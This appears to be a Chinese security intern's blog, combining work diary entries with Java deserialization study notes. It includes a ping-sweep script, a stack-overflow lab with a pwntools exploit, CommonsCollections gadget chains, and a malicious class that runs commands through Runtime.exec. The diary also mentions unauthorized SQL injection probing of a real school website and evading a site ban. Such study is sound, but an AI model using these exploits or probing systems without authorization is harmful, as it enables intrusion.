<span class="keyword">for</span> column <span class="keyword">in</span> columns:</span><br><span class="line">        curstr = row[column]</span><br><span class="line">        <span class="keyword">if</span> pd.isna(curstr):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            strlen = <span class="built_in">len</span>(curstr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        res1 = re.findall(patter1, <span class="built_in">str</span>(curstr))</span><br><span class="line">        res2 = re.findall(patter2, <span class="built_in">str</span>(curstr))</span><br><span class="line">        <span class="keyword">if</span> res1:</span><br><span class="line">            <span class="built_in">print</span>(res1)</span><br><span class="line">        <span class="keyword">if</span> res2:</span><br><span class="line">            <span class="built_in">print</span>(res2)</span><br></pre></td></tr></table></figure>



<h4 id="公众号漏洞"><a href="#公众号漏洞" class="headerlink" title="公众号漏洞"></a>公众号漏洞</h4><table>
<thead>
<tr>
<th align="center">漏洞名称</th>
<th align="center">等级</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">批量提交漏洞</td>
<td align="center">低</td>
<td align="center">可批量提交表单消耗服务器资源</td>
</tr>
<tr>
<td align="center">短信接口滥用</td>
<td align="center">中</td>
<td align="center">任意手机号一小时发五次也算</td>
</tr>
<tr>
<td align="center">敏感信息泄露</td>
<td align="center">低</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">短信验证码绕过</td>
<td align="center">中</td>
<td align="center">修改返回包</td>
</tr>
</tbody></table>
<h3 id="20日："><a href="#20日：" class="headerlink" title="20日："></a>20日：</h3><p>漏洞挖掘，挖到一个中危短信滥用、三个低危敏感信息泄露。</p>
<p>学了点java安全知识。</p>
<h3 id="22日："><a href="#22日：" class="headerlink" title="22日："></a>22日：</h3><p>忘了记了。</p>
<h3 id="24日："><a href="#24日：" class="headerlink" title="24日："></a>24日：</h3><p>还是日常挖洞。一中危（爆破）、二低危</p>
<h3 id="27日："><a href="#27日：" class="headerlink" title="27日："></a>27日：</h3><p>上午找网站洞，下午去客服那里驻场实施、渗透测试、基线检测</p>
<p><strong>堡垒机</strong>：堡垒机，即在一个特定的网络环境下，为了保障网络和数据不受来自外部和内部用户的入侵和破坏，而运用各种技术手段监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。</p>
<p>用一句话来说，堡垒机就是用来后控制哪些人可以登录哪些资产（事先防范和事中控制），以及录像记录登录资产后做了什么事情（事溯源）</p>
<p>堡垒机很多时候也叫运维审计系统，它的核心是可控及审计。可控是指权限可控、行为可控。<strong>权限可控</strong>，比如某个工程师要离职或要转岗了。如果没有一个统一的权限管理入口，是一场梦魇。<strong>行为可控</strong>，比如我们需要集中禁用某个危险命令，如果没有一个统一入口，操作的难度可想而知。</p>
<p><strong>跳板机</strong>：跳板机其实就是一台unix&#x2F;windows操作系统的服务器，所有运维人员都需要先远程登录跳板机，然后再从跳板机登录其他服务器中进行运维操作。</p>
<p>但跳板机并没有实现对运维人员操作行为的控制和审计，使用跳板机过程中还是会有误操作、违规操作导致的操作事故，一旦出现操作事故很难快速定位原因和责任人。此外，跳板机存在严重的安全风险，一旦跳板机系统被攻入，则将后端资源风险完全暴露无遗。同时，对于个别资源（如telnet）可以通过跳板机来完成一定的内控，但是对于更多更特殊的资源（ftp、rdp等）来讲就显得力不从心了。</p>
<p>今天对内网进行基线检测和渗透测试：</p>
<p>先是登录到堡垒机</p>
<p>上传nussues、xshell、xftp</p>
<p>然后扫描内网存活主机：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">chcp 65001&gt;nul</span><br><span class="line"><span class="built_in">echo</span> 正在扫描。。。。。。</span><br><span class="line"><span class="keyword">for</span> /L %%P <span class="keyword">in</span> (1,1,254) <span class="keyword">do</span> @ping -w 10 -n 1 192.168.1.%%P | findstr TTL= &gt;&gt;C:\ping.txt</span><br><span class="line"><span class="built_in">echo</span> 扫描结束，按任意键结束窗口！</span><br><span class="line">pause&gt;nul</span><br></pre></td></tr></table></figure>

<p>然后使用nmap windows版本扫描端口看哪个开了ftp</p>
<p>然后build nussues，批量扫描</p>
<p>当时想要某个内网IP的账号密码，后面说把脚本给运维就行，也就没管了</p>
<p>然后对内网段进行弱密码爆破</p>
<h3 id="29日"><a href="#29日" class="headerlink" title="29日"></a>29日</h3><p>学了小程序的测试已经小程序的源代码怎么解密，怎么导入到开发者工具进行调试等。</p>
<p>协助进行漏洞复测、找到一条低危漏洞（敏感信息泄露）。</p>
<p><del>还想摸鱼学会java漏洞的，没摸成，</del>看小程序漏洞去了。</p>
<h3 id="31日"><a href="#31日" class="headerlink" title="31日"></a>31日</h3><p>仔细看了下逻辑漏洞种类，对网页进行测试，找到一个中危暴力破解，一个低危敏感信息泄露，以及本地搭建flask服务器，前端调用ajax获取待加密字符，然后加密，发回来。</p>
<h2 id="四月"><a href="#四月" class="headerlink" title="四月"></a>四月</h2><h3 id="03日"><a href="#03日" class="headerlink" title="03日"></a>03日</h3><p>进行资产收集和漏洞扫描。</p>
<p>使用的公司工具以及github工具进行收集。</p>
<p>子域名：layer+oneforall</p>
<p>公众号：公司工具+搜狗</p>
<p>Email：公司工具、github工具</p>
<p>还有写百度文库类似的</p>
<h3 id="07日"><a href="#07日" class="headerlink" title="07日"></a>07日</h3><p>学习公司的漏扫机怎样用，对软研院进行测试。<del>以及下周一就得一个人到客户那了，有点烦</del></p>
<p>今天开下sqlmap源码学习。</p>
<p><a href="https://github.com/ZororoZ/fscanOutput">https://github.com/ZororoZ/fscanOutput</a></p>
<p>fscan使用</p>
<h3 id="10日"><a href="#10日" class="headerlink" title="10日"></a>10日</h3><p>学会了landon的使用，发现自己的市里某所高中有sql注入，看到database就不敢看了，怕出事。</p>
<p>上午进行软研院测试以及语雀对应的敏感信息收集，因为语雀翻页频率太高被封了一会（之后借了别人的号</p>
<p>下午去fw进行漏扫及基线检测。</p>
<h3 id="12日"><a href="#12日" class="headerlink" title="12日"></a>12日</h3><p>一天都去进行基线和漏扫了。但是下班比较早</p>
<h3 id="14日"><a href="#14日" class="headerlink" title="14日"></a>14日</h3><p>最后一天，挖了软研院得洞，帮助复测写报告等。</p>
<h1 id="安芯网盾"><a href="#安芯网盾" class="headerlink" title="安芯网盾"></a>安芯网盾</h1><h2 id="环境复现想法"><a href="#环境复现想法" class="headerlink" title="环境复现想法"></a>环境复现想法</h2><table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">是否复现</th>
<th align="center">顺序</th>
</tr>
</thead>
<tbody><tr>
<td align="center">upload-lab</td>
<td align="center">1</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">sql注入</td>
<td align="center"></td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">栈溢出</td>
<td align="center"></td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">格式化字符串漏洞泄露canary</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">xss</td>
<td align="center"></td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">Tomcat_AJP任意文件读取漏洞</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">URLDNS</td>
<td align="center"></td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">CC1</td>
<td align="center"></td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">CC6</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">CC3</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">CC2+CC4+CC5+CC7</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">shiro550</td>
<td align="center"></td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">shiro721</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">爆破</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">unzip漏洞</td>
<td align="center"></td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">ssti漏洞</td>
<td align="center"></td>
<td align="center">9</td>
</tr>
<tr>
<td align="center">fastjson 漏洞</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">jndi漏洞</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">越权漏洞</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">weblogic漏洞</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">log4j漏洞</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">CSRF漏洞</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">文件包含</td>
<td align="center"></td>
<td align="center">10</td>
</tr>
<tr>
<td align="center">敏感信息泄露</td>
<td align="center"></td>
<td align="center">11</td>
</tr>
<tr>
<td align="center">暗链</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">软件压缩目录泄露</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">CORS</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">目录浏览</td>
<td align="center"></td>
<td align="center">12</td>
</tr>
<tr>
<td align="center">spring-boot端点未授权</td>
<td align="center"></td>
<td align="center">13</td>
</tr>
<tr>
<td align="center">批量提交</td>
<td align="center"></td>
<td align="center">14</td>
</tr>
<tr>
<td align="center">swagger未授权</td>
<td align="center"></td>
<td align="center">15</td>
</tr>
<tr>
<td align="center">Thymeleaf远程命令执行（若依CMS）</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Nginx主机实时监控流量数据泄露</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">Springboot Snake YAML 反弹shell</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h2 id="五月"><a href="#五月" class="headerlink" title="五月"></a>五月</h2><h3 id="29日-1"><a href="#29日-1" class="headerlink" title="29日"></a>29日</h3><p>入职，简单了解公司的产品，公司的一些内部的东西。</p>
<h3 id="30日"><a href="#30日" class="headerlink" title="30日"></a>30日</h3><p>搭建漏洞环境进行测试。</p>
<p>很坑的点有：systemctl stop firewalld.service 关闭防火墙</p>
<p>主要是搭建环境测试公司产品会对漏洞进行报警吗</p>
<p>然后今天学到了一些网络的设置，怎么快速搭建服务器之类的</p>
<h3 id="31日-1"><a href="#31日-1" class="headerlink" title="31日"></a>31日</h3><p>今日搭建的漏洞环境为简单的栈溢出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int mainFun()&#123;</span><br><span class="line">   char s;</span><br><span class="line">   fgets(s,50,stdin);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void evilFun()&#123;</span><br><span class="line">  printf(&quot;It&#x27;s a evilFun&quot;);</span><br><span class="line">  system(&quot;/bin/bash&quot;);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    mainFun();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">#name:pwn.sh</span><br><span class="line">socat tcp-l:端口号，fork exec:程序位置，reuseaddr</span><br><span class="line">socat tcp-l:54321,fork exec:./test，reuseaddr #socat tcp-l:端口号，fork exec:程序位置，reuseaddr</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(&quot;192.168.118.128&quot;, 54321)</span><br><span class="line">payload=b&#x27;a&#x27;*1+b&#x27;a&#x27;*8+p64(0x400624)</span><br><span class="line">print(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o test -fno-stack-protector -z execstack test.c</span><br></pre></td></tr></table></figure>

<p>以及go的生成可执行程序需要（导师要求编译生成linux下的可执行程序）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go env -w GOPROXY=https://goproxy.cn</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>日常记录 安全服务实习生</tag>
      </tags>
  </entry>
  <entry>
    <title>java安全学习</title>
    <url>/2023/03/21/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p><a href="https://github.com/phith0n/JavaThings">phith0n&#x2F;JavaThings: Share Things Related to Java - Java安全漫谈笔记相关内容 (github.com)</a></p>
<p><a href="https://paper.seebug.org/1091/">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上） (seebug.org)</a></p>
<p><a href="https://xz.aliyun.com/t/9409#toc-7">CC链 1-7 分析 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://huaweicloud.csdn.net/63a56185b878a54545945a4d.html">CTFSHOW web入门 java反序列化篇（更新中）_java_yu22x-DevPress官方社区 (csdn.net)</a></p>
<p><a href="https://space.bilibili.com/2142877265/channel/collectiondetail?sid=29805&ctype=0">https://space.bilibili.com/2142877265/channel/collectiondetail?sid=29805&amp;ctype=0</a></p>
<p><a href="https://www.anquanke.com/post/id/261724">URLDNS链&amp;CommonsCollections链详细分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p><a href="https://blog.csdn.net/qq_41854911/article/details/122159068">maven引入依赖包，import依赖包，编译运行maven项目_引入meven依赖_小熊coder的博客-CSDN博客</a></p>
<p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></p>
<p><a href="https://www.anquanke.com/post/id/82934">JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<p>[toc]</p>
<p>环境：</p>
<p>cc1：mu85（jdk1.8.1_111）<a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html</a></p>
<p>maven依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>sun中的是.class不是源码怎么办？</p>
<p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">jdk8u&#x2F;jdk8u&#x2F;jdk: af660750b2f4 (openjdk.org)</a></p>
<p>zip下载下来复制其中的sun，然后到对应jdk的src解压复制即可。在porject settings  sdks sourcepath 加入刚刚的src，maven 可以直接download source</p>
<p>查找接口的实现类：</p>
<p>IDEA 风格 <strong>ctrl + alt +B</strong></p>
<p>查看类或接口的继承关系：<strong>ctrl + h</strong></p>
<h2 id="不同cc的利用链："><a href="#不同cc的利用链：" class="headerlink" title="不同cc的利用链："></a>不同cc的利用链：</h2><p>在ysoserial中cc1、cc3、cc5、cc6、cc7对应的commons-collections:3.1<br>cc2、cc4对应的commons-collections4:4.0</p>
<p>来自ysoserial</p>
<p>cc1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		AnnotationInvocationHandler.readObject()</span><br><span class="line">			Map(Proxy).entrySet()</span><br><span class="line">				AnnotationInvocationHandler.invoke()</span><br><span class="line">					LazyMap.get()</span><br><span class="line">						ChainedTransformer.transform()</span><br><span class="line">							ConstantTransformer.transform()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Class.getMethod()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.getRuntime()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.exec()</span><br><span class="line"></span><br><span class="line">Requires:</span><br><span class="line">	commons-collections</span><br></pre></td></tr></table></figure>

<ul>
<li>CommonsCollections &lt;&#x3D; 3.2.1</li>
<li>java &lt; 8u71（我是用的是8u66）</li>
</ul>
<p>cc2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">	Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			PriorityQueue.readObject()</span><br><span class="line">				...</span><br><span class="line">					TransformingComparator.compare()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Runtime.exec()</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>

<p>利用条件比较苛刻：首先 CommonsCollections3 中无法使用，因为其 TransformingComparator 无法序列化。其次只有 CommonsCollections4-4.0 可以使用，因为 CommonsCollections4 其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。</p>
<p>cc3</p>
<p><strong>测试环境</strong>：3.1-3.2.1，jdk7u21及以前</p>
<p>cc4</p>
<p><strong>测试环境</strong>：4.0，jdk7u21及以前</p>
<p>cc5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">	Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br><span class="line"></span><br><span class="line">	Requires:</span><br><span class="line">		commons-collections</span><br><span class="line"> */</span><br><span class="line">/*</span><br><span class="line">This only works in JDK 8u76 and WITHOUT a security manager</span><br></pre></td></tr></table></figure>

<p><strong>测试环境</strong>：3.1-3.2.1，jdk1.8</p>
<p>cc6</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">	Gadget chain:</span><br><span class="line">	    java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashSet.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                                java.lang.Runtime.exec()</span><br><span class="line"></span><br><span class="line">    by @matthias_kaiser</span><br><span class="line">*/</span><br><span class="line">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span><br><span class="line">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>测试环境</strong>：3.1-3.2.1，jdk1.7,1.8</p>
<p>cc7</p>
<p><strong>测试环境</strong>：3.1-3.2.1，jdk1.7,1.8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">    Payload method chain:</span><br><span class="line"></span><br><span class="line">    java.util.Hashtable.readObject</span><br><span class="line">    java.util.Hashtable.reconstitutionPut</span><br><span class="line">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span><br><span class="line">    java.util.AbstractMap.equals</span><br><span class="line">    org.apache.commons.collections.map.LazyMap.get</span><br><span class="line">    org.apache.commons.collections.functors.ChainedTransformer.transform</span><br><span class="line">    org.apache.commons.collections.functors.InvokerTransformer.transform</span><br><span class="line">    java.lang.reflect.Method.invoke</span><br><span class="line">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke</span><br><span class="line">    sun.reflect.NativeMethodAccessorImpl.invoke0</span><br><span class="line">    java.lang.Runtime.exec</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>



<h2 id="Java的动态特性——反射"><a href="#Java的动态特性——反射" class="headerlink" title="Java的动态特性——反射"></a>Java的动态特性——反射</h2><p>参考：</p>
<p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/422128255425528">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p><a href="https://wx.zsxq.com/dweb2/index/columns/2212251881">知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具 (zsxq.com)</a></p>
<p>反射是⼤多数语⾔⾥都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有 ⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将Java这种静态语⾔附加上动态 特性。</p>
<p>“动态特性”：⼀段代码，改变其中的变量，将会导致这段代码产⽣功能性的变化，称之为动态特性</p>
<p>下面是一段反射的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line"> clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>⼏个在反射⾥极为重要的⽅法：</p>
<p> 获取类的⽅法： forName </p>
<p>实例化类对象的⽅法： newInstance </p>
<p>获取函数的⽅法： getMethod </p>
<p>执⾏函数的⽅法： invoke</p>
<p>forName 不是获取“类”的唯⼀途径，通常来说我们有如下三种⽅式获取⼀个“类”，也就 是 java.lang.Class 对象：</p>
<ol>
<li>obj.getClass() 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过 obj.getClass() 来获取它的类 </li>
<li>Test.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接 拿它的 class 属性即可。这个⽅法其实不属于反射。 </li>
<li>Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</li>
</ol>
<p>使⽤反射的⼀⼤⽬的，就是绕过某些沙盒。⽐如，上下⽂中如果只有Integer类型的 数字，我们如何获取到可以执⾏命令的Runtime类呢？也许可以这样（伪代 码）： 1.getClass().forName(“java.lang.Runtime”)</p>
<p>forName有两个函数重载：</p>
<ul>
<li><p>Class forName(String name) </p>
</li>
<li><p>Class forName(String name, <strong>boolean</strong> initialize, ClassLoader loader)</p>
</li>
</ul>
<p>第⼀个就是我们最常⻅的获取class的⽅式，其实可以理解为第⼆种⽅式的⼀个封装：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(className)</span><br><span class="line"><span class="comment">// 等于</span></span><br><span class="line">Class.forName(className, <span class="literal">true</span>, currentLoader)</span><br></pre></td></tr></table></figure>

<p>默认情况下， forName 的第⼀个参数是类名；第⼆个参数表示是否初始化；第三个参数就 是 ClassLoader 。</p>
<p>ClassLoader 是什么呢？它就是⼀个“加载器”，告诉Java虚拟机如何加载这个类。</p>
<p>下面是一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainPrint</span> &#123;</span><br><span class="line"> &#123;</span><br><span class="line"> System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">static</span> &#123;</span><br><span class="line"> System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">TrainPrint</span><span class="params">()</span> &#123;</span><br><span class="line"> System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">Static initial <span class="keyword">class</span> <span class="title class_">org</span>.example.Main$TrainPrint</span><br><span class="line">Empty block initial <span class="keyword">class</span> <span class="title class_">org</span>.example.Main$TrainPrint</span><br><span class="line">Initial <span class="keyword">class</span> <span class="title class_">org</span>.example.Main$TrainPrint</span><br></pre></td></tr></table></figure>

<p>⾸先调⽤的是 static {} ，其次是 {} ，最后是构造函数。</p>
<p>其中， static {} 就是在“类初始化”的时候调⽤的，⽽ {} 中的代码会放在构造函数的 super() 后⾯， 但在当前构造函数内容的前⾯。</p>
<p>forName 中的 initialize&#x3D;true 其实就是告诉Java虚拟机是否执⾏”类初始化“。</p>
<p>假设我们有如下函数，其中函数的参数name可控：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> Class.forName(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们就可以编写⼀个恶意类，将恶意代码放置在 static {} 中，从⽽执⾏：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line"> <span class="keyword">static</span> &#123;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"> String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line"> <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line"> pc.waitFor();</span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"> <span class="comment">// do nothing</span></span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是自己写的demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        excute(<span class="string">&quot;org.example.hello&quot;</span>,<span class="string">&quot;sayHello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">excute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        Class clazz=Class.forName(className);</span><br><span class="line">        clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hello</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    hello()&#123;</span><br><span class="line">        name=<span class="string">&quot;xcc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</p>
